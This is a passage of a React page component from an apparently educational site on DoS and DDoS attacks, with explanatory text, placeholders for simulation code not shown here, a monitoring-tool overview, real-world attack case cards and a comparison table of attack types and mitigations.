      <div className="bg-gray-800 p-4 md:p-6 rounded-lg shadow-md mb-6">
        <h3 className="text-xl font-semibold mb-4">DoS Attack</h3>
        <p className="mb-4 text-gray-300">
          This simulates a Denial of Service (DoS) attack from a single source. The server's response time increases as it gets 
          overwhelmed with requests. A DoS attack is characterized by a high volume of requests from a single source, aiming 
          to exhaust server resources and make the service unavailable to legitimate users.
        </p>
        <div className="bg-gray-900 text-gray-300 p-4 rounded-lg mb-4 overflow-x-auto">
          <pre className="whitespace-pre-wrap">{dosCode}</pre>
        </div>
      </div>

      {/* DDoS Attack Section */}
      <div className="bg-gray-800 p-4 md:p-6 rounded-lg shadow-md mb-6">
        <h3 className="text-xl font-semibold mb-4">DDoS Attack</h3>
        <p className="mb-4 text-gray-300">
          This simulates a Distributed Denial of Service (DDoS) attack using a botnet. The server is overwhelmed by requests 
          from multiple sources simultaneously. Unlike a DoS attack, a DDoS attack originates from many different IP addresses,
          making it much harder to mitigate and significantly more dangerous to server infrastructure.
        </p>
        <div className="bg-gray-900 text-gray-300 p-4 rounded-lg mb-4 overflow-x-auto">
          <pre className="whitespace-pre-wrap">{ddosCode}</pre>
        </div>
      </div>

       {/* DDoS Monitoring Tool Integration */}
      <div className="bg-gray-800 p-4 md:p-6 rounded-lg shadow-md mb-6">
        <h3 className="text-xl font-semibold mb-4 text-green-400">🔧 DDoS Monitoring Tool Integration</h3>
        <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
          <div className="bg-gray-700 p-4 rounded-lg">
            <h4 className="text-lg font-semibold text-blue-400 mb-2">📊 Real-Time Monitoring</h4>
            <p className="text-sm text-gray-300 mb-2">
              <strong>Features:</strong> Live traffic analysis, connection monitoring, threat scoring
            </p>
            <p className="text-sm text-gray-300 mb-2">
              <strong>Detection:</strong> SYN floods, connection floods, traffic floods, port scanning
            </p>
            <p className="text-sm text-gray-300 mb-2">
              <strong>Alerts:</strong> Browser notifications, audio alerts, visual indicators
            </p>
            <p className="text-sm text-gray-300 mb-2">
              <strong>Dashboard:</strong> Interactive charts, real-time metrics, process monitoring
            </p>
            <p className="text-sm text-gray-300">
              <strong>Download:</strong> <a href="https://github.com/Nazonokage/ddos_monitoring" target="_blank" rel="noopener noreferrer" className="text-blue-400 hover:text-blue-300">GitHub Repository</a>
            </p>
          </div>
          
          <div className="bg-gray-700 p-4 rounded-lg">
            <h4 className="text-lg font-semibold text-blue-400 mb-2">🛡️ Advanced Defense Features</h4>
            <p className="text-sm text-gray-300 mb-2">
              <strong>Baseline Learning:</strong> Adaptive traffic pattern recognition
            </p>
            <p className="text-sm text-gray-300 mb-2">
              <strong>Multi-Vector Detection:</strong> Comprehensive attack pattern analysis
            </p>
            <p className="text-sm text-gray-300 mb-2">
              <strong>Threat Intelligence:</strong> Real-time threat scoring and reporting
            </p>
            <p className="text-sm text-gray-300 mb-2">
              <strong>API Endpoints:</strong> RESTful API for integration and automation
            </p>
            <p className="text-sm text-gray-300">
              <strong>Integration:</strong> Works with this simulation for testing and training
            </p>
          </div>
        </div>
        
        {/* Monitoring Tool Features */}
        <div className="mt-6 bg-gray-700 p-4 rounded-lg">
          <h4 className="text-lg font-semibold text-yellow-400 mb-3">🔧 Monitoring Tool Capabilities</h4>
          <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
            <div>
              <h5 className="font-semibold text-green-400 mb-2">Real-Time Analysis</h5>
              <ul className="text-xs text-gray-300 space-y-1">
                <li>• Connection state monitoring</li>
                <li>• Traffic rate analysis</li>
                <li>• Process connection tracking</li>
                <li>• Endpoint identification</li>
              </ul>
            </div>
            <div>
              <h5 className="font-semibold text-green-400 mb-2">Attack Detection</h5>
              <ul className="text-xs text-gray-300 space-y-1">
                <li>• SYN flood detection</li>
                <li>• Connection flood analysis</li>
                <li>• Traffic flood monitoring</li>
                <li>• Port scanning detection</li>
              </ul>
            </div>
            <div>
              <h5 className="font-semibold text-green-400 mb-2">Reporting & Alerts</h5>
              <ul className="text-xs text-gray-300 space-y-1">
                <li>• Detailed attack reports</li>
                <li>• JSON data export</li>
                <li>• Browser notifications</li>
                <li>• Audio/visual alerts</li>
              </ul>
            </div>
          </div>
        </div>
      </div>

      {/* Real-World Attack Scenarios */}
      <div className="bg-gray-800 p-4 md:p-6 rounded-lg shadow-md mb-6">
        <h3 className="text-xl font-semibold mb-4 text-blue-400">🌍 Real-World Attack Scenarios</h3>
        <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
          <div className="bg-gray-700 p-4 rounded-lg">
            <h4 className="text-lg font-semibold text-red-400 mb-2">💥 GitHub Attack (2018)</h4>
            <p className="text-sm text-gray-300 mb-2">
              <strong>Scale:</strong> 1.35 Tbps (largest DDoS attack at the time)
            </p>
            <p className="text-sm text-gray-300 mb-2">
              <strong>Method:</strong> Memcached amplification attack
            </p>
            <p className="text-sm text-gray-300 mb-2">
              <strong>Duration:</strong> 10 minutes
            </p>
            <p className="text-sm text-gray-300">
              <strong>Impact:</strong> GitHub was down for 5 minutes despite having DDoS protection
            </p>
          </div>
          
          <div className="bg-gray-700 p-4 rounded-lg">
            <h4 className="text-lg font-semibold text-red-400 mb-2">🎯 Cloudflare Attack (2020)</h4>
            <p className="text-sm text-gray-300 mb-2">
              <strong>Scale:</strong> 754 million packets per second
            </p>
            <p className="text-sm text-gray-300 mb-2">
              <strong>Method:</strong> Multi-vector attack (UDP + TCP)
            </p>
            <p className="text-sm text-gray-300 mb-2">
              <strong>Duration:</strong> 2 hours
            </p>
            <p className="text-sm text-gray-300">
              <strong>Impact:</strong> Successfully mitigated by Cloudflare's network
            </p>
          </div>
          
          <div className="bg-gray-700 p-4 rounded-lg">
            <h4 className="text-lg font-semibold text-red-400 mb-2">🏦 Bank Attack (2019)</h4>
            <p className="text-sm text-gray-300 mb-2">
              <strong>Scale:</strong> 200 Gbps
            </p>
            <p className="text-sm text-gray-300 mb-2">
              <strong>Method:</strong> Layer 7 HTTP flood
            </p>
            <p className="text-sm text-gray-300 mb-2">
              <strong>Duration:</strong> 3 days
            </p>
            <p className="text-sm text-gray-300">
              <strong>Impact:</strong> Online banking services disrupted for 2 days
            </p>
          </div>
          
          <div className="bg-gray-700 p-4 rounded-lg">
            <h4 className="text-lg font-semibold text-red-400 mb-2">🎮 Gaming Platform (2021)</h4>
            <p className="text-sm text-gray-300 mb-2">
              <strong>Scale:</strong> 2.4 Tbps
            </p>
            <p className="text-sm text-gray-300 mb-2">
              <strong>Method:</strong> Multi-vector with botnet
            </p>
            <p className="text-sm text-gray-300 mb-2">
              <strong>Duration:</strong> 6 hours
            </p>
            <p className="text-sm text-gray-300">
              <strong>Impact:</strong> Gaming services unavailable, $50M+ in lost revenue
            </p>
          </div>
        </div>
      </div>

      {/* Attack Comparison Table */}
       <div className="bg-gray-800 p-6 rounded-lg shadow-md mb-6">
        <h3 className="text-xl font-semibold mb-4 text-blue-400">📊 Attack Comparison Matrix</h3>
        <div className="overflow-x-auto">
          <table className="min-w-full bg-gray-700 border border-gray-600">
            <thead>
              <tr className="bg-gray-600">
                <th className="py-3 px-4 border border-gray-600 text-left">Feature</th>
                <th className="py-3 px-4 border border-gray-600 text-center">Normal Traffic</th>
                <th className="py-3 px-4 border border-gray-600 text-center">DoS Attack</th>
                <th className="py-3 px-4 border border-gray-600 text-center">DDoS Attack</th>
                <th className="py-3 px-4 border border-gray-600 text-center">Layer 3/4</th>
                <th className="py-3 px-4 border border-gray-600 text-center">Layer 7</th>
              </tr>
            </thead>
            <tbody>
              <tr>
                <td className="py-3 px-4 border border-gray-600 font-medium">Source</td>
                <td className="py-3 px-4 border border-gray-600 text-center">Multiple legitimate users</td>
                <td className="py-3 px-4 border border-gray-600 text-center">Single attacker</td>
                <td className="py-3 px-4 border border-gray-600 text-center">Multiple attackers (botnet)</td>
                <td className="py-3 px-4 border border-gray-600 text-center">Distributed sources</td>
                <td className="py-3 px-4 border border-gray-600 text-center">Botnet + compromised servers</td>
              </tr>
              <tr>
                <td className="py-3 px-4 border border-gray-600 font-medium">Traffic Volume</td>
                <td className="py-3 px-4 border border-gray-600 text-center text-green-400">Low to moderate</td>
                <td className="py-3 px-4 border border-gray-600 text-center text-yellow-400">High</td>
                <td className="py-3 px-4 border border-gray-600 text-center text-red-400">Very high</td>
                <td className="py-3 px-4 border border-gray-600 text-center text-orange-400">Extremely high</td>
                <td className="py-3 px-4 border border-gray-600 text-center text-purple-400">High (sophisticated)</td>
              </tr>
              <tr>
                <td className="py-3 px-4 border border-gray-600 font-medium">Detection Difficulty</td>
                <td className="py-3 px-4 border border-gray-600 text-center text-green-400">Easy</td>
                <td className="py-3 px-4 border border-gray-600 text-center text-yellow-400">Easy</td>
                <td className="py-3 px-4 border border-gray-600 text-center text-orange-400">Moderate</td>
                <td className="py-3 px-4 border border-gray-600 text-center text-red-400">Hard</td>
                <td className="py-3 px-4 border border-gray-600 text-center text-red-400">Very hard</td>
              </tr>
              <tr>
                <td className="py-3 px-4 border border-gray-600 font-medium">Mitigation Strategy</td>
                <td className="py-3 px-4 border border-gray-600 text-center">No action needed</td>
                <td className="py-3 px-4 border border-gray-600 text-center">IP blocking, rate limiting</td>
                <td className="py-3 px-4 border border-gray-600 text-center">Traffic analysis, CDN, WAF</td>
                <td className="py-3 px-4 border border-gray-600 text-center">Network-level filtering</td>
                <td className="py-3 px-4 border border-gray-600 text-center">Behavioral analysis, ML</td>
              </tr>
              <tr>
                <td className="py-3 px-4 border border-gray-600 font-medium">Typical Duration</td>
                <td className="py-3 px-4 border border-gray-600 text-center">Continuous</td>
                <td className="py-3 px-4 border border-gray-600 text-center">Minutes to hours</td>
                <td className="py-3 px-4 border border-gray-600 text-center">Hours to days</td>
                <td className="py-3 px-4 border border-gray-600 text-center">Minutes to hours</td>
                <td className="py-3 px-4 border border-gray-600 text-center">Hours to weeks</td>
              </tr>
            </tbody>
          </table>
        </div>
      </div>
    </div>
  );
};

export default DDosPage;